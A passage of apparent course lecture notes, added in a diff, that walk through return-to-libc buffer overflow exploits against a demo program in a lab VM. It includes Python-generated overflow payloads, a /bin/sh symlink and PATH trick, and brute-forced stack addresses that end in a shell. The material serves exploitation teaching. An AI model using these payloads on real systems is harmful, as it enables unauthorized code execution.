+[pid  2460] stat64("/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/usr/games/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/usr/local/games/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] write(2, "sh: 1: ", 7sh: 1: )      = 7
+[pid  2460] write(2, "4\17\2: not found", 144: not found) = 14
+[pid  2460] write(2, "\n", 1
+(...)
+</pre>
+<p>
+What you see is that it is looking for the string "4\17\2" along the
+path. All we need to do is create a file along the execution path for
+"4\17\2" that will execute a shell.
+</p>
+
+<p>
+To start, let's create a symbolic link to /bin/sh called "4\17\2":
+</p>
+<pre class="example">
+user@si485H-base:demo$ ln -s /bin/sh $(printf "4\17\2")
+user@si485H-base:demo$ ls -l 4^O^B 
+lrwxrwxrwx 1 user user 7 Nov 24 10:04 4?? -&gt; /bin/sh
+</pre>
+<p>
+Now, we just need to edit the <code>PATH</code> environment variable to put this
+along the path lookup:
+</p>
+<pre class="example">
+user@si485H-base:demo$ export PATH=.:$PATH
+user@si485H-base:demo$ echo $PATH
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+</pre>
+<p>
+Now, let's exploit away:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
+$
+</pre>
+<p>
+Boom shell!
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">3.2</span> Jumping to the Exploit String</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+Another option is to write an address to the stack where <code>system()</code>
+will use it as its argument. Consider that we have control of the
+stack at this point, and we can write arbitrarily to the stack, so the
+question is, what address do we write? Why not jump to the exploit
+string itself.
+</p>
+
+<p>
+Consider this version of the exploit again this time, I'm going to use
+0xdeadbeef for the address of system and then 0xcafebabe for the
+address where the address of "/bin/sh" should be.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\xef\xbe\xad\xde' + 'BBBB' + '\xbe\xba\xfe\xca'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ?AAAA????
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[ 7089.578719] harder[2566]: segfault at deadbeef ip deadbeef sp bffff690 error 15
+</pre>
+
+<p>
+After the return/leave, the segfault occurs revealing the stack
+pointer at the time of the exploit, and this is EXACTLY the
+information we need in order to calculate the address of the start of
+the exploit string where "/bin/sh;" lives. 
+</p>
+
+<p>
+Consider again, that after the return and leave, the stack looks like this:
+</p>
+<pre class="example">
+ebp -&gt; ???
+
+       |  ....  |
+       |--------|
+       |cafebabe|
+       |--------|
+esp -&gt; |  BBBB  | ---.
+       |--------|    |
+       :        :    |
+       : ...    :    | 
+       : AAAA   :    |  esp - 0x28 - 0x8
+       : ;AAA   :    |
+       : /cat   :    |
+       : /bin   :    |
+       ' - -- - '----'
+</pre>
+
+<p>
+Looking at the exploit closely, you see that <code>esp</code> references the
+"BBBB" following the exploit, we see that this address is exactly
+0x28+8 bytes away from the start of the exploit string. We know this
+because the return address was 0x28+4 bytes away, and this is four
+bytes beyond that. That means, if we replace 0xcafebabe with
+0xbffff690-0x28-8=0xbffff660, we should get the exploit we want. Let's
+give it a try:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
+Segmentation fault (core dumped)
+</pre>
+<p>
+That didn't work &#x2014; I think that <code>system()</code> messed up our string in
+some way, but now we are in the range. Let's keep trying addresses up from there:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
+Segmentation fault (core dumped)
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x65\xf6\xff\xbf'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBe???
+Segmentation fault (core dumped)
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x6a\xf6\xff\xbf'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBj???
+Segmentation fault (core dumped)
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x70\xf6\xff\xbf'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBp???
+sh: 1: AAAAAAAAAAAAAAAA: not found
+Segmentation fault (core dumped)
+</pre>
+<p>
+Now, we've got something cooking. System is trying to execute some
+input we provided. Let's just make the rest of the string "/bin/sh;"
+and maybe we'll get lucky:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x70\xf6\xff\xbf'"`
+/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;AAAA???BBBBp???
+$
+</pre>
+<p>
+So while we didn't get the first one, we eventually found a "/bin/sh".
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
